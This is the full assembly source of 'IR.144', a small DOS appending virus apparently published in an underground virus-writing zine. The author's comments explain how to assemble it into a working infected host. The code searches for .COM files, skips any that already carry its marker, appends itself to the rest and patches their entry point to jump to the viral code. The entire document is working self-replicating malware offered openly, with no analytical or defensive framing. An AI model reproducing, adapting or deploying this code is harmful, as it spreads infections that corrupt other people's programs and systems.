; Virusname: IR.144
; Origin   : Sweden
; Author   : Metal Militia/Immortal Riot
;
; Ok, this is not one of the very tiny viruses out there today, but to
; date this is the smallest one I've ever made and since I never really
; care about size when I write my creations I think thisone's pretty ok.
; There are others out there on about 100 bytes that does the same, but
; who gives a shit? If you don't like thisone, take a look at my
; "fixed-up" version [UNIQ], also included in this issue of Insane
; Reality.
;
; In order to get thisone working it needs a host, so create the
; following bytes of code and then do a "copy /b dummy.com+ir144.com
; ready.com" and woha! A very working copy.
;
; -----------------------
; .model tiny ; DUMMY.ASM
; .code
; org 100h
;
; sov:
;
; xchg ax,ax ; nop
; xchg ax,ax ; nop
; xchg ax,ax ; nop
; xchg ax,ax ; nop
;
; end sov
; -----------------------
.model tiny ; IR144.ASM
.radix 16
.code
        org 100
start:
        call    get_offset

get_offset:
        pop     bp                    ; get the
        sub     bp,offset get_offset  ; delta offset

        lea     si,[buffa_bytes+bp]   ; restore our
        mov     di,100                ; first four
        movsw                         ; bytes
        movsw

        lea     dx,[end_virus+bp]     ; set the
        mov     ah,1a                 ; DTA to eov
        int     21

        lea     dx,[find_files+bp]    ; matching "*.com"
        mov     ah,4e                 ; find first
find_next:
        int     21
        jc      reset_DTA

        lea     dx,[end_virus+1e+bp]
        mov     ax,3d02               ; open it
        int     21

        jc      get_more

        xchg    bx,ax

        mov     cx,4                  ; first four bytes
        mov     ah,3f                 ; read em
        lea     dx,[buffa_bytes+bp]   ; and put them in
        int     21                    ; our buffer

        cmp     byte ptr [buffa_bytes+bp+3],'V'   ; check if already
        jz      close_em                          ; infected

        mov     ax,4202                           ; goto EOF
        sub     cx,cx
        cwd
        int     21

        sub     ax,3
        mov     word ptr [bp+jump_bytes+1],ax     ; use our 'jmp' bytes

        mov     ah,40                             ; write our
        mov     cx,end_virus-start                ; viral code
        lea     dx,[bp+start]                     ; to victim file
        int     21

        mov     ax,4200                           ; goto SOF
        sub     cx,cx
        cwd
        int     21

        mov     ah,40                             ; write our
        mov     cx,4                              ; first four
        lea     dx,[bp+jump_bytes]                ; bytes over
        int     21                                ; the original

close_em:
        mov     ah,3e                             ; close file
        int     21

get_more:
        mov     ah,4f                             ; find next
        jmp     find_next

reset_DTA:
        mov     dx,80                             ; reset the DTA
        mov     ah,1a
        int     21

        mov     di,100                           ; and return
        push    di                               ; to the original
        ret                                      ; program


find_files      db      '*.com',0                ; victim files
jump_bytes      db      0e9,0,0,'V'              ; our 'jmp' bytes

buffa_bytes:          ; the original first four bytes will be put here
        xchg    ax,ax ; nop
        xchg    ax,ax ; nop
        int     20    ; ret(urn) to prompt

end_virus:
end start